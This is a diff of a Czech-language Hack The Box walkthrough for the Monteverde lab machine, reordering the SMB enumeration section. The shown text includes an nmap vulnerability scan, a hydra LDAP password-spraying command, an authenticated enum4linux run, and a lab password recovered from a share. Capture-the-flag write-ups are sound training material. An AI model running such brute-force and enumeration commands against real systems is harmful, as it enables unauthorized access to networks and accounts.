@@ -9,6 +9,7 @@ tags: windows linux kerberos ldap winrm active-directory
 ## Úvod a kontext
 
 Monteverde je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
@@ -65,6 +66,16 @@ Nejprve mapuji veřejně dostupné služby, protože právě z otevřených port
 nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771 -n -v -sV -Pn --script *vuln*,*enum* $IP
 ```
 
+### Enumerace SMB
+
+U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
+```bash
+./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
+```
+```
+=> home$/mhope/azure.xml: 4n0therD4y@n0th3r$
+```
+
 ## Analýza zjištění
 
 ### Lámání hesel nebo hashů
@@ -75,18 +86,6 @@ hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
 ```
 ```
 => [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: __CENSORED__
-```
-
-## Počáteční průzkum
-
-### Enumerace SMB
-
-U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
-```bash
-./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
-```
-```
-=> home$/mhope/azure.xml: 4n0therD4y@n0th3r$
 ```
 
 ## Získání přístupu
